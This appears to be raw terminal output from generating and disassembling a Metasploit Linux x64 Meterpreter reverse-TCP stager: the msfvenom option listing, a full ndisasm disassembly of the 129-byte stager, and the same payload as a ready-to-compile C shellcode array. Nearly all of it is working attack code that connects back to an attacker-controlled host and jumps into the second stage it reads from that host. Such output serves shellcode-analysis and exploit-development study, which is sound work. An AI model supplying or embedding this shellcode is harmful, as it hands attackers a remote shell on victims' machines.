msfvenom -p linux/x64/meterpreter/reverse_tcp --list-options

Options for payload/linux/x64/meterpreter/reverse_tcp:
=========================


       Name: Linux Mettle x64, Reverse TCP Stager
     Module: payload/linux/x64/meterpreter/reverse_tcp
   Platform: Linux, Linux
       Arch: x64
Needs Admin: No
 Total size: 298
       Rank: Normal

Provided by:
    Brent Cook <bcook@rapid7.com>
    ricky
    tkmru

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Inject the mettle server payload (staged). Connect back to the
  attacker

msfvenom -p linux/x64/meterpreter/reverse_tcp  -a x64 --platform linux -f raw | ndisasm -u -b 64 -

No encoder or badchars specified, outputting raw payload
Payload size: 129 bytes

00000000  4831FF            xor rdi,rdi
00000003  6A09              push byte +0x9
00000005  58                pop rax
00000006  99                cdq
00000007  B610              mov dh,0x10
00000009  4889D6            mov rsi,rdx
0000000C  4D31C9            xor r9,r9
0000000F  6A22              push byte +0x22
00000011  415A              pop r10
00000013  B207              mov dl,0x7
00000015  0F05              syscall
00000017  4885C0            test rax,rax
0000001A  7852              js 0x6e
0000001C  6A0A              push byte +0xa
0000001E  4159              pop r9
00000020  56                push rsi
00000021  50                push rax
00000022  6A29              push byte +0x29
00000024  58                pop rax
00000025  99                cdq
00000026  6A02              push byte +0x2
00000028  5F                pop rdi
00000029  6A01              push byte +0x1
0000002B  5E                pop rsi
0000002C  0F05              syscall
0000002E  4885C0            test rax,rax
00000031  783B              js 0x6e
00000033  4897              xchg rax,rdi
00000035  48B90200115C7F00  mov rcx,0x100007f5c110002
         -0001
0000003F  51                push rcx
00000040  4889E6            mov rsi,rsp
00000043  6A10              push byte +0x10
00000045  5A                pop rdx
00000046  6A2A              push byte +0x2a
00000048  58                pop rax
00000049  0F05              syscall
0000004B  59                pop rcx
0000004C  4885C0            test rax,rax
0000004F  7925              jns 0x76
00000051  49FFC9            dec r9
00000054  7418              jz 0x6e
00000056  57                push rdi
00000057  6A23              push byte +0x23
00000059  58                pop rax
0000005A  6A00              push byte +0x0
0000005C  6A05              push byte +0x5
0000005E  4889E7            mov rdi,rsp
00000061  4831F6            xor rsi,rsi
00000064  0F05              syscall
00000066  59                pop rcx
00000067  59                pop rcx
00000068  5F                pop rdi
00000069  4885C0            test rax,rax
0000006C  79C7              jns 0x35
0000006E  6A3C              push byte +0x3c
00000070  58                pop rax
00000071  6A01              push byte +0x1
00000073  5F                pop rdi
00000074  0F05              syscall
00000076  5E                pop rsi
00000077  5A                pop rdx
00000078  0F05              syscall
0000007A  4885C0            test rax,rax
0000007D  78EF              js 0x6e
0000007F  FFE6              jmp rsi


msfvenom -p linux/x64/meterpreter/reverse_tcp  -a x64 --platform linux -f C

No encoder or badchars specified, outputting raw payload
Payload size: 129 bytes
Final size of c file: 567 bytes
unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x52\x6a\x0a"
"\x41\x59\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
"\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0"
"\xa8\x01\x39\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
"\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58"
"\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f"
"\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x5a"
"\x0f\x05\x48\x85\xc0\x78\xef\xff\xe6";
